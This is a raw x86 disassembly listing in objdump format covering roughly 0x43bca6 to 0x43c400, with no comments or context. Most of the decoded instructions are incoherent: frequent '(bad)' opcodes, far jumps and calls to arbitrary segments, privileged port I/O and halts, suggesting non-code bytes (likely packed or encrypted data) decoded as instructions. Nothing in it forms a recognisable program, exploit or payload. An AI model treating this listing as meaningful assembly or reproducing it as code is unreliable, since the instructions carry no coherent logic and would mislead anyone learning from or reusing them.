  43bca6:	add    BYTE PTR [edx+esi*2-0x2],al
  43bcaa:	aas    
  43bcab:	imul   ebx,DWORD PTR ds:0x31825d48,0xb1fb50d3
  43bcb5:	push   cs
  43bcb6:	div    BYTE PTR [esi+ecx*1]
  43bcb9:	jbe    0x43bcff
  43bcbb:	sub    DWORD PTR [edx+0x5e],ebx
  43bcbe:	and    edx,ecx
  43bcc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bcc1:	ins    BYTE PTR es:[edi],dx
  43bcc2:	(bad)  
  43bcc3:	fcompp 
  43bcc5:	into   
  43bcc6:	je     0x43bcfb
  43bcc8:	sub    DWORD PTR [esi],edx
  43bcca:	mov    BYTE PTR [eax+0x1a],al
  43bccd:	jmp    0xf901:0x132e960e
  43bcd4:	mov    ch,0x17
  43bcd6:	mov    bh,0x80
  43bcd8:	mov    ch,0xe9
  43bcda:	(bad)  
  43bcdb:	jmp    0xf254abce
  43bce0:	out    dx,al
  43bce1:	stos   DWORD PTR es:[edi],eax
  43bce2:	call   esp
  43bce4:	sbb    ebp,edi
  43bce6:	aas    
  43bce7:	stc    
  43bce8:	ret    
  43bce9:	or     eax,0xea1a0d68
  43bcee:	add    edx,DWORD PTR [ebp-0x7d]
  43bcf1:	repnz sahf 
  43bcf3:	pop    ss
  43bcf4:	mov    ebp,0x42f984e7
  43bcf9:	xor    eax,0x8b
  43bcfe:	add    BYTE PTR [eax],al
  43bd00:	ins    DWORD PTR es:[edi],dx
  43bd01:	push   edx
  43bd02:	push   cs
  43bd03:	test   eax,esi
  43bd05:	inc    edx
  43bd06:	or     DWORD PTR [ecx+0x4e0d31],esp
  43bd0c:	and    ch,BYTE PTR [esi]
  43bd0e:	(bad)  
  43bd10:	test   eax,0x80191b5
  43bd15:	daa    
  43bd16:	jb     0x43bd5c
  43bd18:	jns    0x43bd40
  43bd1a:	pop    DWORD PTR [eax+edi*2]
  43bd1d:	mov    ch,0xe
  43bd1f:	mov    DWORD PTR [eax-0x6f3fc44e],ebp
  43bd25:	mov    edx,DWORD PTR [eax+0x4]
  43bd28:	nop
  43bd29:	jl     0x43bd79
  43bd2b:	in     eax,0x69
  43bd2d:	xor    dl,cl
  43bd2f:	repz test BYTE PTR [ebx-0x4c720dee],cl
  43bd36:	mov    dh,0x43
  43bd38:	nop
  43bd39:	dec    edi
  43bd3a:	call   0x3ff8:0xb0723829
  43bd41:	iret   
  43bd42:	push   edx
  43bd43:	je     0x43bdb2
  43bd45:	aam    0x11
  43bd47:	mov    BYTE PTR [ecx-0x337af1f1],bh
  43bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bd4e:	push   cs
  43bd4f:	xchg   DWORD PTR [ecx],edx
  43bd51:	dec    ebx
  43bd52:	or     eax,0x9b2a9000
  43bd57:	addr16 push esp
  43bd59:	dec    ebx
  43bd5a:	fwait
  43bd5b:	dec    esp
  43bd5c:	lods   al,BYTE PTR ds:[esi]
  43bd5d:	arpl   WORD PTR [ebp+0xe4a9488],dx
  43bd63:	add    BYTE PTR [eax],al
  43bd65:	add    BYTE PTR [eax],al
  43bd67:	add    BYTE PTR [eax],al
  43bd69:	ret    
  43bd6a:	mov    edx,edx
  43bd6c:	mov    ebp,0x23074b98
  43bd71:	and    al,0x77
  43bd73:	into   
  43bd74:	jmp    ebp
  43bd76:	dec    ebp
  43bd77:	mov    dh,0x6b
  43bd79:	dec    esp
  43bd7a:	dec    ebx
  43bd7b:	jmp    0xaae7:0xd0df664c
  43bd82:	jmp    0xb58b68e
  43bd87:	call   0x900b:0xeeff1343
  43bd8e:	(bad)  
  43bd8f:	fsubr  QWORD PTR [esi+ebx*4]
  43bd92:	mov    eax,0x3d63519c
  43bd97:	inc    ebp
  43bd98:	js     0x43bdc3
  43bd9a:	xchg   DWORD PTR [edx],edx
  43bd9c:	call   0xf94addd5
  43bda1:	out    0xb2,al
  43bda3:	dec    esp
  43bda4:	inc    esi
  43bda5:	xchg   esp,eax
  43bda6:	mov    dl,0x88
  43bda8:	out    dx,al
  43bda9:	lahf   
  43bdaa:	ret    
  43bdab:	aaa    
  43bdac:	add    al,0xbd
  43bdae:	pusha  
  43bdaf:	and    bl,BYTE PTR [ecx]
  43bdb1:	fmul   QWORD PTR [esi+0x58388cc7]
  43bdb7:	ret    
  43bdb8:	test   DWORD PTR [edx+0x67dcf7f2],0xe1b1edde
  43bdc2:	push   edi
  43bdc3:	int3   
  43bdc4:	fbld   TBYTE PTR [ebx+0x4a2c252b]
  43bdca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bdcb:	aaa    
  43bdcc:	sub    al,0x0
  43bdce:	add    BYTE PTR [eax],al
  43bdd0:	add    BYTE PTR [eax],al
  43bdd2:	inc    esp
  43bdd3:	stc    
  43bdd4:	pushf  
  43bdd5:	sbb    BYTE PTR [ebx+0x1e],dh
  43bdd8:	int3   
  43bdd9:	ret    
  43bdda:	pop    ds
  43bddb:	pop    esi
  43bddc:	rep stos DWORD PTR es:[edi],eax
  43bdde:	stos   DWORD PTR es:[edi],eax
  43bddf:	out    dx,al
  43bde0:	idiv   edi
  43bde2:	adc    DWORD PTR [ebp+0x5773574f],0x31
  43bde9:	jg     0x43bdbb
  43bdeb:	faddp  st(3),st
  43bded:	sbb    BYTE PTR [ebx-0x103c1b46],ah
  43bdf3:	sub    al,0xcb
  43bdf5:	mov    ebp,DWORD PTR [edi-0x12]
  43bdf8:	neg    edx
  43bdfa:	pop    esi
  43bdfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bdfc:	test   BYTE PTR [ebx],0x90
  43bdff:	(bad)  
  43be01:	aam    0xf
  43be03:	add    ecx,DWORD PTR [eax-0x507b8b4d]
  43be09:	pushf  
  43be0a:	ss out dx,al
  43be0c:	imul   DWORD PTR [ebx]
  43be0e:	jg     0x43be70
  43be10:	rcl    DWORD PTR [edi],0x7d
  43be13:	jb     0x43be4d
  43be15:	inc    ebx
  43be16:	lods   eax,DWORD PTR cs:[esi]
  43be18:	shl    cl,1
  43be1a:	sti    
  43be1b:	les    esi,FWORD PTR [edi]
  43be1d:	add    al,0x65
  43be1f:	jb     0x43be30
  43be21:	stos   BYTE PTR es:[edi],al
  43be22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be23:	xchg   ebx,eax
  43be24:	out    0xd5,al
  43be26:	push   ebx
  43be27:	push   edi
  43be28:	in     al,0xec
  43be2a:	sub    ecx,ebx
  43be2c:	push   edx
  43be2d:	jmp    0x20a6bfa9
  43be32:	mov    esp,0x8e73c9
  43be37:	add    BYTE PTR [eax],al
  43be39:	add    BYTE PTR [eax],al
  43be3b:	jg     0x43be6b
  43be3d:	iret   
  43be3e:	std    
  43be3f:	push   ebx
  43be40:	pop    edx
  43be41:	add    al,0xe1
  43be43:	bound  edx,QWORD PTR [edi+0x2f61620e]
  43be49:	js     0x43be70
  43be4b:	mov    WORD PTR [edi-0x4d6b0a70],ds
  43be51:	push   cs
  43be52:	aam    0x57
  43be54:	mov    eax,cs:0xeb294e1
  43be5a:	fs xchg esi,eax
  43be5c:	fimul  WORD PTR [eax]
  43be5e:	lahf   
  43be5f:	xchg   bl,al
  43be61:	jle    0x43be38
  43be63:	push   ebx
  43be64:	push   edi
  43be65:	xchg   ebx,eax
  43be66:	sub    DWORD PTR [ecx],esp
  43be68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43be69:	ds cdq 
  43be6b:	inc    ebx
  43be6c:	xchg   BYTE PTR [eax+eiz*2-0x16ad2fe4],bh
  43be73:	stos   DWORD PTR es:[edi],eax
  43be74:	jg     0x43be5a
  43be76:	push   ss
  43be77:	xchg   DWORD PTR [ebp+0x2d52afce],eax
  43be7d:	shl    DWORD PTR [edi-0x3b1603ae],1
  43be83:	cmp    edi,DWORD PTR [esi+0x2dfde94e]
  43be89:	frstor [ebp+edx*2-0x22]
  43be8d:	and    DWORD PTR [edx-0x64],ebp
  43be90:	pop    ecx
  43be91:	arpl   WORD PTR [ebx],bx
  43be93:	adc    DWORD PTR [ebx+eiz*2+0x7],esp
  43be97:	sahf   
  43be98:	mov    bl,0x76
  43be9a:	cmp    eax,0xe56d0
  43be9f:	add    BYTE PTR [eax],al
  43bea1:	add    BYTE PTR [eax],al
  43bea3:	add    BYTE PTR [ebp+0x51],bl
  43bea6:	repnz push es
  43bea8:	dec    esp
  43bea9:	mov    edi,0x263984e7
  43beae:	push   es
  43beaf:	mov    eax,ds:0x4e06f1
  43beb4:	add    dh,BYTE PTR [edx]
  43beb6:	(bad)  
  43beb8:	imul   esi,DWORD PTR [edx-0x3092b96f],0xaead6996
  43bec2:	xchg   ebx,eax
  43bec3:	sub    BYTE PTR [ebp-0x51],0xe
  43bec7:	add    al,ah
  43bec9:	pop    ss
  43beca:	add    bl,BYTE PTR [esi-0x6]
  43becd:	and    dl,BYTE PTR [ebx+0x5dbd9fec]
  43bed3:	adc    al,0xb6
  43bed5:	inc    edx
  43bed6:	sbb    bh,bh
  43bed8:	pop    esp
  43bed9:	scas   al,BYTE PTR es:[edi]
  43beda:	out    0x75,eax
  43bedc:	xor    DWORD PTR [ebp+0x721c53fd],edi
  43bee2:	jmp    0xa2f0:0x93a9fc8a
  43bee9:	out    dx,eax
  43beea:	neg    BYTE PTR [esi-0x7418433a]
  43bef0:	scas   eax,DWORD PTR es:[edi]
  43bef1:	pop    ds
  43bef2:	inc    ebp
  43bef3:	ret    0xb1f9
  43bef6:	cmp    eax,0xe707858b
  43befb:	jne    0x43beea
  43befd:	mov    esp,0x4296105d
  43bf02:	push   ss
  43bf03:	call   FWORD PTR [ecx+ebp*4-0x19]
  43bf07:	adc    eax,0x0
  43bf0c:	add    BYTE PTR [ecx+0x32002a45],bl
  43bf12:	and    dl,BYTE PTR [edx]
  43bf14:	mov    ecx,ecx
  43bf16:	sub    edx,ebp
  43bf18:	call   0x2b7e79
  43bf1d:	inc    edx
  43bf1e:	xchg   esp,eax
  43bf1f:	inc    esp
  43bf20:	pop    ebp
  43bf21:	nop
  43bf22:	or     ebx,esp
  43bf24:	(bad)  
  43bf25:	cmp    al,0xd0
  43bf27:	ss push edx
  43bf29:	lahf   
  43bf2a:	xchg   esi,eax
  43bf2b:	jmp    0xa073:0x37f1df8
  43bf32:	sbb    al,0x9a
  43bf34:	or     eax,DWORD PTR [edi-0x5a06e562]
  43bf3a:	aas    
  43bf3b:	fistp  QWORD PTR [edi]
  43bf3d:	nop
  43bf3e:	loopne 0x43bef9
  43bf40:	pop    es
  43bf41:	sbb    edi,DWORD PTR [ebx]
  43bf43:	cwde   
  43bf44:	retf   0x9278
  43bf47:	add    edi,ecx
  43bf49:	pop    edi
  43bf4a:	loopne 0x43bf74
  43bf4c:	pop    edx
  43bf4d:	mov    ch,0x9
  43bf4f:	(bad)  
  43bf51:	in     al,0xd0
  43bf53:	ss push edx
  43bf55:	inc    edi
  43bf56:	pop    esi
  43bf57:	out    0xf8,al
  43bf59:	lds    edx,FWORD PTR [edi+0x3]
  43bf5c:	jae    0x43befe
  43bf5e:	hlt    
  43bf5f:	cdq    
  43bf60:	or     ebp,DWORD PTR [edi]
  43bf62:	jbe    0x43bf7a
  43bf64:	stc    
  43bf65:	jge    0x43bf62
  43bf67:	fidivr WORD PTR [edi]
  43bf69:	nop
  43bf6a:	loopne 0x43bf25
  43bf6c:	pop    es
  43bf6d:	or     ebx,DWORD PTR [ebx+0xca97]
  43bf73:	add    BYTE PTR [eax],al
  43bf75:	add    al,bh
  43bf77:	jge    0x43bf7c
  43bf79:	stc    
  43bf7a:	pop    es
  43bf7b:	shr    BYTE PTR [eax],1
  43bf7d:	pop    edx
  43bf7e:	pop    ebp
  43bf7f:	mov    esi,ebx
  43bf81:	call   FWORD PTR [eax+eiz*8+0x36]
  43bf85:	jge    0x43bf7b
  43bf87:	ret    0xec8f
  43bf8a:	xchg   esp,eax
  43bf8b:	enter  0x23ae,0x88
  43bf8f:	dec    ebx
  43bf90:	lahf   
  43bf91:	sub    al,0xbb
  43bf93:	pop    es
  43bf94:	mov    esp,0xca371850
  43bf99:	or     BYTE PTR [ecx],bl
  43bf9b:	aaa    
  43bf9c:	retf   0x790f
  43bf9f:	mov    dl,0x52
  43bfa1:	or     BYTE PTR [esi],ah
  43bfa3:	add    DWORD PTR [ebx-0x39],edi
  43bfa6:	jae    0x43bf66
  43bfa8:	iret   
  43bfa9:	arpl   WORD PTR [esi-0x2f8026ab],dx
  43bfaf:	fnstsw WORD PTR [ecx]
  43bfb1:	mov    DWORD PTR [ebp+0x2080a9a],esp
  43bfb7:	repnz ins BYTE PTR es:[edi],dx
  43bfb9:	mov    esi,0x88f7c88f
  43bfbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bfbf:	and    bh,dh
  43bfc1:	adc    al,0xa5
  43bfc3:	imul   eax,DWORD PTR [eax-0x7eaa0024],0x992e6888
  43bfcd:	(bad)  
  43bfce:	mov    bh,0x32
  43bfd0:	adc    al,0xe0
  43bfd2:	mov    BYTE PTR [edx-0x3d8c38a4],dh
  43bfd8:	ins    BYTE PTR es:[edi],dx
  43bfd9:	sub    al,0x0
  43bfdb:	add    BYTE PTR [eax],al
  43bfdd:	add    BYTE PTR [eax],al
  43bfdf:	mov    esp,0xa1538fab
  43bfe4:	push   ebx
  43bfe5:	jno    0x43c00f
  43bfe7:	xchg   ebx,eax
  43bfe8:	dec    edx
  43bfe9:	pusha  
  43bfea:	sti    
  43bfeb:	sub    BYTE PTR [ebp+ebp*2+0x44],dl
  43bfef:	cmp    BYTE PTR [edi-0xf],bh
  43bff2:	adc    al,0x19
  43bff4:	in     eax,dx
  43bff5:	or     al,0x8f
  43bff7:	mov    esp,eax
  43bff9:	xor    al,0x28
  43bffb:	push   cs
  43bffc:	mov    ds:0x8e5485fc,al
  43c001:	ret    
  43c002:	sub    edi,DWORD PTR [eax+0xe1430c0]
  43c008:	jo     0x43bfb3
  43c00a:	mov    ch,0x44
  43c00c:	daa    
  43c00d:	sbb    esi,DWORD PTR [esi-0x4d0854db]
  43c013:	dec    esp
  43c014:	std    
  43c015:	mov    DWORD PTR [esp+ecx*1+0x5d38a562],ebp
  43c01c:	sub    cl,BYTE PTR [edi]
  43c01e:	popf   
  43c01f:	out    0xc2,eax
  43c021:	xchg   ebp,eax
  43c022:	xchg   edi,eax
  43c023:	mov    edi,0x751ae9cd
  43c028:	dec    edx
  43c029:	fmul   DWORD PTR [esi-0x7f]
  43c02c:	pop    ecx
  43c02d:	xchg   esi,eax
  43c02e:	aas    
  43c02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c030:	out    0x74,al
  43c032:	into   
  43c033:	(bad)  
  43c034:	ins    BYTE PTR es:[edi],dx
  43c035:	xchg   esi,eax
  43c036:	shl    DWORD PTR [esp+ebx*1+0x7a],1
  43c03a:	mov    esp,0xe5412da3
  43c03f:	ds int 0xe9
  43c042:	cli    
  43c043:	add    BYTE PTR [eax],al
  43c045:	add    BYTE PTR [eax],al
  43c047:	add    BYTE PTR [ebp+ebp*1-0x36286e19],bh
  43c04e:	jmp    0x43bfee
  43c050:	out    dx,eax
  43c051:	bound  edx,QWORD PTR [esp+eax*4-0x716c4bf8]
  43c058:	clc    
  43c059:	mov    bh,0x93
  43c05b:	jg     0x43c055
  43c05d:	mov    ebx,0x2d8b7240
  43c062:	fdiv   QWORD PTR [ecx-0xafe7109]
  43c068:	mov    cl,BYTE PTR [edx+0x5c]
  43c06b:	sub    ah,BYTE PTR [ecx-0x741b09a7]
  43c071:	mov    edi,0x2c8354d2
  43c076:	(bad)  
  43c077:	(bad)  
  43c079:	dec    edx
  43c07a:	aas    
  43c07b:	out    dx,al
  43c07c:	sbb    BYTE PTR [ecx-0x6a],0x2e
  43c080:	lods   al,BYTE PTR ds:[esi]
  43c081:	jmp    0x43c094
  43c083:	mov    ss:0xd641d92d,eax
  43c089:	mov    cl,0xe9
  43c08b:	es jbe 0x43c0a3
  43c08e:	dec    edx
  43c08f:	mov    edi,0x2a47fe20
  43c094:	(bad)  
  43c096:	xor    ah,ch
  43c098:	xchg   edi,eax
  43c099:	sub    eax,0x565b00d5
  43c09e:	mov    esp,0xe73aa101
  43c0a3:	(bad)  
  43c0a4:	mov    esi,0x6931e8b3
  43c0a9:	in     al,dx
  43c0aa:	adc    al,BYTE PTR [eax]
  43c0ac:	add    BYTE PTR [eax],al
  43c0ae:	add    BYTE PTR [eax],al
  43c0b0:	add    BYTE PTR [edx],ch
  43c0b2:	and    ebp,DWORD PTR [esi]
  43c0b4:	add    al,0xb5
  43c0b6:	rcl    eax,cl
  43c0b8:	jb     0x43c06a
  43c0ba:	jl     0x43c098
  43c0bc:	call   0x2b802d
  43c0c1:	ret    0x38ac
  43c0c4:	sar    BYTE PTR [ebx],0xba
  43c0c7:	push   cs
  43c0c8:	inc    ebp
  43c0ca:	pop    edx
  43c0cb:	push   cs
  43c0cc:	xor    esi,DWORD PTR [eax]
  43c0ce:	or     BYTE PTR [ecx+eax*1-0x15a5158],bh
  43c0d5:	push   cs
  43c0d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c0d7:	test   al,0x4
  43c0d9:	jns    0x43c080
  43c0db:	bound  esp,QWORD PTR [esi*2+0x1b52d169]
  43c0e2:	mov    BYTE PTR [ecx],ch
  43c0e4:	call   0x2b64cb
  43c0e9:	sti    
  43c0ea:	mov    ecx,0x55bd810e
  43c0ef:	in     al,dx
  43c0f0:	jmp    FWORD PTR [ecx]
  43c0f2:	imul   edx,ecx,0xbad0e453
  43c0f8:	and    al,0x8d
  43c0fa:	mov    eax,0xd0e6000e
  43c0ff:	loopne 0x43c08b
  43c101:	jo     0x43c13b
  43c103:	out    0x1,al
  43c105:	(bad)  
  43c106:	cmp    esi,DWORD PTR [esi]
  43c108:	add    ecx,edi
  43c10a:	mov    ch,0x93
  43c10c:	inc    edi
  43c10d:	cmc    
  43c10e:	sbb    esp,DWORD PTR [ecx]
  43c110:	or     dh,bh
  43c112:	cmp    DWORD PTR [edx],ecx
  43c114:	add    DWORD PTR [eax],eax
  43c116:	add    BYTE PTR [eax],al
  43c118:	add    BYTE PTR [eax],al
  43c11a:	stc    
  43c11b:	mov    ch,0x3c
  43c11d:	push   eax
  43c11e:	nop
  43c11f:	test   al,0xe6
  43c121:	outs   dx,DWORD PTR ds:[esi]
  43c122:	sbb    DWORD PTR [ebx],0xe
  43c125:	jge    0x43c0ff
  43c127:	pop    edx
  43c128:	or     eax,0xe5c2d83
  43c12d:	add    BYTE PTR [ebx],bl
  43c12f:	sbb    DWORD PTR [edx],edx
  43c131:	mov    edx,DWORD PTR [edi+esi*2-0x6]
  43c135:	dec    edi
  43c136:	adc    eax,DWORD PTR [esi]
  43c138:	add    al,ch
  43c13a:	test   eax,0xcf919a6
  43c13f:	sbb    al,0x10
  43c141:	test   BYTE PTR [edi+0x5000e5b],ah
  43c147:	mov    al,0xf6
  43c149:	daa    
  43c14a:	js     0x43c164
  43c14c:	retf   
  43c14d:	cli    
  43c14e:	xchg   edi,ebx
  43c150:	push   edx
  43c151:	je     0x43c140
  43c153:	aam    0xce
  43c155:	and    edx,DWORD PTR [ebx+eiz*1+0x306f20f8]
  43c15c:	ins    BYTE PTR es:[edi],dx
  43c15d:	lock or eax,0xd508731
  43c163:	xchg   esi,esi
  43c165:	daa    
  43c166:	mov    esi,0xe6e828c4
  43c16b:	xchg   DWORD PTR [ecx],ebx
  43c16d:	stc    
  43c16e:	or     eax,0x8340871b
  43c173:	sbb    esp,DWORD PTR [ebx-0x6cf41fb1]
  43c179:	in     al,dx
  43c17a:	pushf  
  43c17b:	fmulp  st(6),st
  43c17d:	and    eax,DWORD PTR [eax]
  43c17f:	add    BYTE PTR [eax],al
  43c181:	add    BYTE PTR [eax],al
  43c183:	je     0x43c16d
  43c185:	xchg   BYTE PTR [ebx],ah
  43c187:	pop    eax
  43c188:	rcl    dh,cl
  43c18a:	and    esp,DWORD PTR [eax+0x2b]
  43c18d:	gs inc esp
  43c18f:	mov    ah,0xb3
  43c191:	gs inc esp
  43c193:	lods   al,BYTE PTR ds:[esi]
  43c194:	inc    edi
  43c195:	push   es
  43c196:	mov    dl,0xee
  43c198:	lahf   
  43c199:	inc    DWORD PTR [ebx-0x7744e30]
  43c19f:	call   0x53d8812a
  43c1a4:	mov    dl,0x72
  43c1a6:	enter  0x9eb3,0xa6
  43c1aa:	mov    bl,0xa
  43c1ac:	(bad)  
  43c1ad:	fucomi st,st(7)
  43c1af:	mov    bh,0xd
  43c1b1:	sbb    edx,DWORD PTR [ecx]
  43c1b3:	leave  
  43c1b4:	cmp    eax,DWORD PTR [eax]
  43c1b6:	jg     0x43c204
  43c1b8:	xchg   esi,eax
  43c1b9:	(bad)  
  43c1ba:	sbb    ebx,esi
  43c1bc:	pop    ebx
  43c1bd:	icebp  
  43c1be:	adc    BYTE PTR ds:0x91edc080,dl
  43c1c4:	push   ecx
  43c1c5:	sar    DWORD PTR [esi+0x4c],0x96
  43c1c9:	sti    
  43c1ca:	sbb    edi,DWORD PTR [edi+eax*4]
  43c1cd:	rcl    BYTE PTR [eax],cl
  43c1cf:	jne    0x43c17f
  43c1d1:	aas    
  43c1d2:	or     BYTE PTR [edi-0x2b8107b0],al
  43c1d8:	xchg   esi,eax
  43c1d9:	jmp    0x43c18e
  43c1db:	js     0x43c1a5
  43c1dd:	sti    
  43c1de:	adc    BYTE PTR [ebx+0x67c3e5da],al
  43c1e4:	clc    
  43c1e5:	ret    0x5
  43c1e8:	add    BYTE PTR [eax],al
  43c1ea:	add    BYTE PTR [eax],al
  43c1ec:	pop    edi
  43c1ed:	push   eax
  43c1ee:	clc    
  43c1ef:	cwde   
  43c1f0:	rol    BYTE PTR [ebx],0xf7
  43c1f3:	xchg   DWORD PTR [ebp-0x39],esp
  43c1f6:	push   es
  43c1f7:	aad    0x5c
  43c1f9:	cmp    al,0x65
  43c1fb:	test   BYTE PTR [ebx],bh
  43c1fd:	mov    ch,0xe1
  43c1ff:	repnz or ah,dh
  43c202:	jno    0x43c282
  43c204:	fnstcw WORD PTR [edx+0x4d76b73f]
  43c20a:	inc    ecx
  43c20b:	jl     0x43c22d
  43c20d:	ss inc edx
  43c20f:	xchg   edi,eax
  43c210:	pusha  
  43c211:	fdivr  st(6),st
  43c213:	mov    ah,0x61
  43c215:	cmp    eax,0xe2c3e7b4
  43c21a:	push   cs
  43c21b:	call   0x8ffc:0x8d044b44
  43c222:	push   cs
  43c223:	push   0xffffff9b
  43c225:	xchg   edx,eax
  43c226:	sbb    DWORD PTR [esi+0x4c],edi
  43c229:	ss (bad) 
  43c22b:	pushf  
  43c22c:	out    0x9e,al
  43c22e:	xlat   BYTE PTR ds:[ebx]
  43c22f:	mov    eax,0x1f960122
  43c234:	dec    esi
  43c235:	(bad)  
  43c236:	xor    dh,BYTE PTR [ebp-0x97b3c55]
  43c23c:	(bad)  
  43c23d:	xor    ecx,edi
  43c23f:	fidivr WORD PTR [esi]
  43c241:	or     eax,0x2b8cb796
  43c246:	adc    al,0xde
  43c248:	xchg   edi,eax
  43c249:	in     al,dx
  43c24a:	dec    ecx
  43c24b:	xor    al,0x1a
  43c24d:	or     eax,0x6846
  43c252:	add    BYTE PTR [eax],al
  43c254:	add    BYTE PTR [eax-0x6e],cl
  43c257:	or     al,0xe9
  43c259:	xchg   ebx,eax
  43c25a:	adc    BYTE PTR [ebx],dl
  43c25c:	jmp    0xb814940c
  43c261:	(bad)  
  43c262:	adc    BYTE PTR [ebx],dl
  43c264:	jmp    0xbdbaa3ab
  43c269:	adc    edx,esi
  43c26b:	push   cs
  43c26c:	adc    ecx,DWORD PTR [eax+eiz*4+0x375996c5]
  43c273:	jmp    FWORD PTR [eax]
  43c275:	mov    WORD PTR ds:0xc6a66cdf,?
  43c27b:	sbb    al,0x72
  43c27d:	inc    ecx
  43c27e:	sub    edi,edi
  43c280:	sub    BYTE PTR [ecx+eiz*8-0x4265168c],dl
  43c287:	inc    ecx
  43c288:	sub    WORD PTR [ebx],di
  43c28b:	jmp    FWORD PTR [eax-0x2230cc6d]
  43c291:	xchg   esi,eax
  43c292:	loop   0x43c27d
  43c294:	hlt    
  43c295:	stos   DWORD PTR es:[edi],eax
  43c296:	mov    ds:0x7f9004e,al
  43c29b:	inc    eax
  43c29c:	jmp    FWORD PTR [edx-0x397a1935]
  43c2a2:	sub    esi,ebp
  43c2a4:	push   eax
  43c2a5:	pop    ds
  43c2a6:	in     al,0xe9
  43c2a8:	(bad)  
  43c2a9:	in     al,dx
  43c2aa:	sar    dh,cl
  43c2ac:	aas    
  43c2ad:	stc    
  43c2ae:	pop    ds
  43c2af:	dec    eax
  43c2b0:	mov    ch,BYTE PTR [edx-0x16fb53e5]
  43c2b6:	mov    edi,0x2462
  43c2bb:	add    BYTE PTR [eax],al
  43c2bd:	add    BYTE PTR [ebp-0x74ad2e9d],bh
  43c2c3:	mov    ch,0xf6
  43c2c5:	call   0xc32b828f
  43c2ca:	lods   eax,DWORD PTR ds:[esi]
  43c2cb:	mov    dl,0xe7
  43c2cd:	je     0x43c26c
  43c2cf:	mov    edx,0x646bc93b
  43c2d4:	fsub   st(0),st
  43c2d6:	fidivr WORD PTR [esi-0x49140019]
  43c2dc:	push   cs
  43c2dd:	push   ebp
  43c2de:	add    ch,BYTE PTR [esi-0x45661397]
  43c2e4:	push   cs
  43c2e5:	add    ah,dh
  43c2e7:	xor    cl,cl
  43c2e9:	sti    
  43c2ea:	es mov ebp,0xc9ae565b
  43c2f0:	clc    
  43c2f1:	call   0x28a10d
  43c2f6:	hlt    
  43c2f7:	stc    
  43c2f8:	mov    eax,0x93b26901
  43c2fd:	iret   
  43c2fe:	and    DWORD PTR [eax+edi*4-0x3c9f3901],ebx
  43c305:	test   ecx,ebp
  43c307:	cmp    DWORD PTR [esi+0x6a],ecx
  43c30a:	pop    ebp
  43c30b:	xor    edx,DWORD PTR [esi-0x28]
  43c30e:	call   0xea970214
  43c313:	mov    esp,0x4990f7fd
  43c318:	into   
  43c319:	dec    DWORD PTR [esp+ebx*4]
  43c31c:	fwait
  43c31d:	das    
  43c31e:	jbe    0x43c2d2
  43c320:	sahf   
  43c321:	inc    edx
  43c322:	add    BYTE PTR [eax],al
  43c324:	add    BYTE PTR [eax],al
  43c326:	add    dh,bl
  43c328:	pop    es
  43c329:	jmp    0xc323:0x7f6ff87c
  43c330:	xchg   edx,eax
  43c331:	mov    bl,0x86
  43c333:	pop    esp
  43c334:	push   ds
  43c335:	mov    ecx,DWORD PTR ss:[ebp-0xd]
  43c339:	popf   
  43c33a:	mov    ch,0x24
  43c33c:	ss sar bh,cl
  43c33f:	add    al,0xef
  43c341:	sbb    eax,0x5b4cffb
  43c346:	xchg   ecx,eax
  43c347:	add    cl,BYTE PTR [edi+0x1c]
  43c34a:	adc    eax,0x54
  43c34d:	ror    BYTE PTR [si],0x9c
  43c351:	xchg   BYTE PTR [esi],al
  43c353:	arpl   WORD PTR [ebx],bx
  43c355:	mov    cl,0x86
  43c357:	or     eax,0x9ff91a0c
  43c35c:	and    cl,BYTE PTR [ecx]
  43c35e:	call   DWORD PTR [edi+0x7283695b]
  43c364:	jo     0x43c382
  43c366:	stc    
  43c367:	sbb    BYTE PTR [ebx-0x32],dl
  43c36a:	inc    esi
  43c36b:	add    eax,0x33cb8b02
  43c370:	fwait
  43c371:	adc    cl,BYTE PTR [ebx-0x6e5f4eb]
  43c377:	mov    ebx,DWORD PTR [bp+di]
  43c37a:	adc    ebp,DWORD PTR [edx+ecx*2]
  43c37d:	into   
  43c37e:	call   DWORD PTR [edx]
  43c380:	mov    esi,0x79c5feea
  43c385:	addr16 inc edx
  43c387:	mov    WORD PTR [ebp+0x17d5],?
  43c38d:	add    BYTE PTR [eax],al
  43c38f:	add    ah,al
  43c391:	popa   
  43c392:	sahf   
  43c393:	clc    
  43c394:	popf   
  43c395:	dec    ebx
  43c396:	loopne 0x43c3d7
  43c398:	nop
  43c399:	mov    dl,0x5c
  43c39b:	mov    dh,0x93
  43c39d:	mov    cl,0x37
  43c39f:	mov    ah,0xa
  43c3a1:	aas    
  43c3a2:	sub    BYTE PTR [edi],cl
  43c3a4:	sbb    DWORD PTR [ebp+0x50],ecx
  43c3a7:	push   ebp
  43c3a8:	mov    ah,0x4f
  43c3aa:	push   ecx
  43c3ab:	sbb    DWORD PTR [ebp-0x4cb84c1],ecx
  43c3b1:	dec    esp
  43c3b2:	and    DWORD PTR [eax+edi*1],ebx
  43c3b5:	iret   
  43c3b6:	cmp    BYTE PTR ds:0x3accec49,cl
  43c3bc:	es mov dh,0xf7
  43c3bf:	mov    dh,0x14
  43c3c1:	pop    esi
  43c3c2:	jne    0x43c3ec
  43c3c4:	fdiv   DWORD PTR [eax]
  43c3c6:	in     al,dx
  43c3c7:	call   FWORD PTR [edx]
  43c3c9:	(bad)  
  43c3ca:	fild   DWORD PTR [edi]
  43c3cc:	push   ebp
  43c3cd:	pop    edx
  43c3ce:	jbe    0x43c425
  43c3d0:	mov    ebx,0x73c0734c
  43c3d5:	mov    edx,0x4ee1340f
  43c3da:	icebp  
  43c3db:	xchg   eax,edx
  43c3dd:	(bad)
  43c3e0:	sub    dl,BYTE PTR [ebp-0x3f]
  43c3e3:	or     al,0xe5
  43c3e5:	mov    dl,0xcc
  43c3e7:	add    DWORD PTR [esi-0x4c409c99],edi
  43c3ed:	mov    edx,0x4e4174bf
  43c3f2:	mov    eax,ds:0x79
  43c3f7:	add    BYTE PTR [eax],al
  43c3f9:	xor    eax,0xcb266ce8
  43c3fe:	jo     0x43c3fc
  43c400:	add    edi,DWORD PTR [eax-0x7f]
